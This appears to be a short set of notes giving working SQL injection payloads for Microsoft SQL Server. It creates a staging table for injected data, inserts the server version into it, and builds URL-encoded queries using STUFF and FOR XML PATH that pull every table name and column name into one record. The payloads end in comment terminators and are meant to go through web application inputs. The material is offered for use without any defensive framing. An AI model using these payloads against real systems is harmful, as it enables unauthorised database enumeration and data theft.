MSSQL Server Useful Queries and notes
===========
############## CREATING A TABLE TO STORE INJECTION DATA ##############

Create a table to inject into:
```sql
CREATE TABLE YOUNAMEYOURTABLE ( ID int IDENTITY(1,1) PRIMARY KEY,  data varchar(8000));--
```
Insert data into your table:
```sql
insert into YOUNAMEYOURTABLE (data) Select @@Version--
```
Grab All the Database Tables into 1 record separated by a ';'

if not using a web application, replace the %2b with a +
```sql
%2bSTUFF((SELECT '; ' %2b TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 
'BASE TABLE' AND TABLE_CATALOG='REPLACEME' FOR XML PATH('')), 1, 1, '')--
```
Grab All the Table Columns into 1 record separated by a ';'

if not using a web application, replace the %2b with a +
```sql
SELECT 'PutTheTableNameHereForReference: ' %2bSTUFF((SELECT '; ' 
%2b column_name FROM TheDatabaseYouWantToQueryFrom.INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='REPLACEME' 
FOR XML PATH('')), 1, 1, '')--
```
